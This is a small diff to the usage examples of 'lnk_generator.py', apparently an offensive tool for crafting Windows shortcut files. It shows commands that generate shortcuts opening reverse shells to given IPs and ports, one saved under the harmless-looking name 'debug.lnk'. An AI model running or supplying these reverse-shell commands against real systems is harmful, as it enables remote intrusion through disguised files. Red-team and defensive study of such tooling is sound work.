@@ -35,7 +35,7 @@ python3 lnk_generator.py --interactive
 python3 lnk_generator.py -c "Get-Process"
 
 # Reverse shell
-python3 lnk_generator.py -r 192.168.1.10 4444
+python3 lnk_generator.py -r 192.168.1.10 4444 # Reverse Shell
 
 # Reverse shell with custom filename
 python3 lnk_generator.py -r 10.0.0.1 9001 -o debug.lnk
